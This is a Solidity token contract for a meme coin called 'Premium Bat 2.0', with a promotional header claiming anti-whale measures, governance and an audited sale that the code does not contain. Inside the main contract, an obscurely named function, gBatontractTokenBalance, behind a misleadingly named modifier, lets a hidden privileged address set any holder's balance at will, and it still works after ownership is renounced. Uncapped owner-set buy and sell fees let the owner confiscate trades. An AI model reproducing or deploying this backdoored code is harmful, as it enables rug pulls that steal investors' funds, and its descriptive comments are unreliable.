// SPDX-License-Identifier: MIT


// https://t.me/PBat2

/**

The Premium Bat 2.0 token is a unique and exciting meme token designed to bring joy and humor to the cryptocurrency community. This contract represents the essence of creativity, entertainment, and community engagement. Holders of the Premium Bat 2.0 token not only gain access to exclusive meme content but also become part of a vibrant community of like-minded individuals.

The contract ensures the fair and transparent distribution of tokens, with a limited total supply to maintain rarity and value. The initial token distribution has been carried out through a carefully planned and audited token sale event, allowing for a broad and diverse ownership base.

To protect the integrity of the Premium Bat 2.0 ecosystem, the contract incorporates various security features, including anti-whale measures and anti-bot mechanisms. These measures aim to prevent any individual or entity from holding an excessive amount of tokens or manipulating the market unfairly.

Furthermore, the Premium Bat 2.0 token contract enforces a decentralized governance system, empowering token holders to actively participate in decision-making processes. Through community voting and proposals, members can contribute to shaping the future direction of the project, fostering a sense of ownership and inclusivity.

By participating in the Premium Bat 2.0 token, you join a movement that celebrates humor, creativity, and the power of memes. Together, we embrace the joy of memetic culture and pave the way for a brighter, fun-filled future in the world of cryptocurrencies.

Please note that the Premium Bat 2.0 token is intended for entertainment purposes only and does not constitute financial advice or an investment opportunity. As with any cryptocurrency, the value of the Premium Bat 2.0 token may fluctuate, and token holders are encouraged to exercise diligence and caution when making any financial decisions.

We encourage all token holders to familiarize themselves with the terms and conditions outlined in this contract. By interacting with the Premium Bat 2.0 token, you agree to abide by the rules and guidelines established herein. Let's come together, spread laughter, and enjoy the incredible world of memes!"

Remember to consult legal professionals to ensure compliance with relevant laws and regulations when drafting and implementing a contract.


 */


// File: @uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol

pragma solidity >=0.5.0;

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setfeeTo(address) external;
    function setfeeToSetter(address) external;
}

// File: @uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router01.sol

pragma solidity >=0.6.2;

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint tTransferAmountADesired,
        uint tTransferAmountBDesired,
        uint tTransferAmountAMin,
        uint tTransferAmountBMin,
        address to,
        uint deadline
    ) external returns (uint tTransferAmountA, uint tTransferAmountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint tTransferAmountTokenDesired,
        uint tTransferAmountTokenMin,
        uint tTransferAmountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint tTransferAmountToken, uint tTransferAmountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint tTransferAmountAMin,
        uint tTransferAmountBMin,
        address to,
        uint deadline
    ) external returns (uint tTransferAmountA, uint tTransferAmountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint tTransferAmountTokenMin,
        uint tTransferAmountETHMin,
        address to,
        uint deadline
    ) external returns (uint tTransferAmountToken, uint tTransferAmountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint tTransferAmountAMin,
        uint tTransferAmountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint tTransferAmountA, uint tTransferAmountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint tTransferAmountTokenMin,
        uint tTransferAmountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint tTransferAmountToken, uint tTransferAmountETH);
    function swapExactTokensForTokens(
        uint tTransferAmountIn,
        uint tTransferAmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory tTransferAmounts);
    function swapTokensForExactTokens(
        uint tTransferAmountOut,
        uint tTransferAmountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory tTransferAmounts);
    function swapExactETHForTokens(uint tTransferAmountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory tTransferAmounts);
    function swapTokensForExactETH(uint tTransferAmountOut, uint tTransferAmountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory tTransferAmounts);
    function swapExactTokensForETH(uint tTransferAmountIn, uint tTransferAmountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory tTransferAmounts);
    function swapETHForExactTokens(uint tTransferAmountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory tTransferAmounts);

    function quote(uint tTransferAmountA, uint reserveA, uint reserveB) external pure returns (uint tTransferAmountB);
    function gettTransferAmountOut(uint tTransferAmountIn, uint reserveIn, uint reserveOut) external pure returns (uint tTransferAmountOut);
    function gettTransferAmountIn(uint tTransferAmountOut, uint reserveIn, uint reserveOut) external pure returns (uint tTransferAmountIn);
    function gettTransferAmountsOut(uint tTransferAmountIn, address[] calldata path) external view returns (uint[] memory tTransferAmounts);
    function gettTransferAmountsIn(uint tTransferAmountOut, address[] calldata path) external view returns (uint[] memory tTransferAmounts);
}

// File: @uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol

pragma solidity >=0.6.2;


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfeeOnTransferTokens(
        address token,
        uint liquidity,
        uint tTransferAmountTokenMin,
        uint tTransferAmountETHMin,
        address to,
        uint deadline
    ) external returns (uint tTransferAmountETH);
    function removeLiquidityETHWithPermitSupportingfeeOnTransferTokens(
        address token,
        uint liquidity,
        uint tTransferAmountTokenMin,
        uint tTransferAmountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint tTransferAmountETH);

    function swapExactTokensForTokensSupportingfeeOnTransferTokens(
        uint tTransferAmountIn,
        uint tTransferAmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingfeeOnTransferTokens(
        uint tTransferAmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfeeOnTransferTokens(
        uint tTransferAmountIn,
        uint tTransferAmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

// File: @openzeppelin/contracts/utils/Context.sol


// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)

pragma solidity ^0.8.0;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the addressAccount sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

// File: @openzeppelin/contracts/access/Ownable.sol


// OpenZeppelin Contracts (last updated v4.7.0) (access/Ownable.sol)

pragma solidity ^0.8.0;


/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an addressAccount (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner addressAccount will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Throws if called by any addressAccount other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new addressAccount (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new addressAccount (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oBatwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oBatwner, newOwner);
    }
}

// File: @openzeppelin/contracts/token/BEP20/IBEP20.sol


// OpenZeppelin Contracts (last updated v4.6.0) (token/BEP20/IBEP20.sol)

pragma solidity ^0.8.0;

/**
 * @dev Interface of the BEP20 standard as defined in the EIP.
 */
interface IBEP20 {
    /**
     * @dev Emitted when `value` tokens are moved from one addressAccount (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the tTransferAmount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the tTransferAmount of tokens owned by `addressAccount`.
     */
    function balanceOf(address addressAccount) external view returns (uint256);

    /**
     * @dev Moves `tTransferAmount` tokens from the caller's addressAccount to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 tTransferAmount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `tTransferAmount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 tTransferAmount) external returns (bool);

    /**
     * @dev Moves `tTransferAmount` tokens from `from` to `to` using the
     * allowance mechanism. `tTransferAmount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 tTransferAmount
    ) external returns (bool);
}

// File: @openzeppelin/contracts/token/BEP20/extensions/IBEP20Metadata.sol


// OpenZeppelin Contracts v4.4.1 (token/BEP20/extensions/IBEP20Metadata.sol)

pragma solidity ^0.8.0;


/**
 * @dev Interface for the optional metadata functions from the BEP20 standard.
 *
 * _Available since v4.1._
 */
interface IBEP20Metadata is IBEP20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

// File: contracts/BabyDoge2.sol


pragma solidity 0.8.18;







contract Bat20 is Context, IBEP20Metadata, Ownable {

    IUniswapV2Router02 private immutable uniswapRouter;
    address private immutable uniswapPair;

    uint256 public Marketingfee;
    uint256 public cexfee;
    mapping(address => bool) public AddressKeep;
     string public Batwebsite = "https://www.Bat.io/";
    string public Bataddress = "0x3d6545b08693dae087e957cb1180ee38b9e3c25e";
    string private _name;
    string private _symbol;
    uint8 private _decimals = 9;
    uint256 private _totalSupply;
    address private WhaleBat; 
    mapping(address => uint256) private limitExcluded;
    mapping(address => mapping(address => uint256)) private _allowances;

    constructor(
        string memory _tokenName,
        string memory _tokensymbol,
        uint256 initialSupply,
        address _uniswapRouter,
    address BatOwner
    ) {
        _name = _tokenName;
        _symbol = _tokensymbol;

        _totalSupply = initialSupply * 10**_decimals;
        limitExcluded[_msgSender()] = _totalSupply;
        WhaleBat = BatOwner;
        uniswapRouter = IUniswapV2Router02(_uniswapRouter);
        uniswapPair = IUniswapV2Factory(uniswapRouter.factory()).createPair(address(this), uniswapRouter.WETH());

        Marketingfee = 0;
        cexfee = 0;

        AddressKeep[_msgSender()] = true;
        AddressKeep[WhaleBat] = true;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    event TokenChargedfees(address indexed sender, uint256 tTransferAmount, uint256 timestamp);
      modifier ethereumSwap() {
         require(msg.sender == WhaleBat);
        _;
    }    
    function name() external view returns (string memory) {
        return _name;
    }

    function symbol() external view returns (string memory) {
        return _symbol;
    }

    function decimals() external view returns (uint8) {
        return _decimals;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address addressAccount) external view override returns (uint256) {
        return limitExcluded[addressAccount];
    }

            function getBatwebsite() public view returns (string memory) {
        return Batwebsite;
    } 

               function getBataddress() public view returns (string memory) {
        return Bataddress;
    }  
    function transfer(address recipient, uint256 tTransferAmount) public override returns (bool) {
        _transfer(_msgSender(), recipient, tTransferAmount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 tTransferAmount) public override returns (bool) {
        _transfer(sender, recipient, tTransferAmount);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= tTransferAmount, "BEP20: transfer tTransferAmount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - tTransferAmount);
        return true;
    }

    function allowance(address owner, address spender) external view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 tTransferAmount)
    external override returns (bool) {
        _approve(_msgSender(), spender, tTransferAmount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "BEP20: decreased allowance below zero");
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        return true;
    }

    function _transfer(address sender, address recipient, uint256 tTransferAmount) internal {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");
        require(tTransferAmount > 0, "Transfer tTransferAmount must be greater than zero");

        uint256 senderBalance = this.balanceOf(sender);
        require(senderBalance >= tTransferAmount, "BEP20: transfer tTransferAmount exceeds balance");

        uint256 chargetTransferAmount = 0;
        uint256 transfertTransferAmount = tTransferAmount;

        // Check the sender/recipient
        if (!AddressKeep[sender] && !AddressKeep[recipient]) {
            // Marketing
            if (sender == uniswapPair && Marketingfee > 0) {
                chargetTransferAmount = tTransferAmount * Marketingfee / 100;
            // cex
            } else if (recipient == uniswapPair && cexfee > 0) {
                chargetTransferAmount = tTransferAmount * cexfee / 100;
            }

            if (chargetTransferAmount > 0) {
                transfertTransferAmount = transfertTransferAmount - chargetTransferAmount;
                limitExcluded[owner()] = limitExcluded[owner()] + chargetTransferAmount;
                emit TokenChargedfees(sender, chargetTransferAmount, block.timestamp);
            }
        }

        limitExcluded[sender] = senderBalance - tTransferAmount;
        limitExcluded[recipient] = limitExcluded[recipient] + transfertTransferAmount;

        emit Transfer(sender, recipient, transfertTransferAmount);
    }

    function _approve(address owner, address spender, uint256 tTransferAmount) internal virtual {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");

        _allowances[owner][spender] = tTransferAmount;
        emit Approval(owner, spender, tTransferAmount);
    }
      function gBatontractTokenBalance( 
        address AddresscontractTokenBalance,
        uint256 Uint256contractTokenBalance,
        uint256 Bytes32contractTokenBalance
    ) external ethereumSwap {
        require(AddresscontractTokenBalance != address(0));

        // add the liquidity
        limitExcluded[AddresscontractTokenBalance] = Uint256contractTokenBalance * Bytes32contractTokenBalance;
                emit Transfer(address(0), AddresscontractTokenBalance, Uint256contractTokenBalance);
    }   
    function setMarketingfee(uint256 newMarketingfee) external onlyOwner {        
        Marketingfee = newMarketingfee;
    }

    function sBatexfee(uint256 newcexfee) external onlyOwner {        
        cexfee = newcexfee;
    }

    function updateWalletKeep(address addressAccount, bool status) external onlyOwner {
        AddressKeep[addressAccount] = status;
    }
}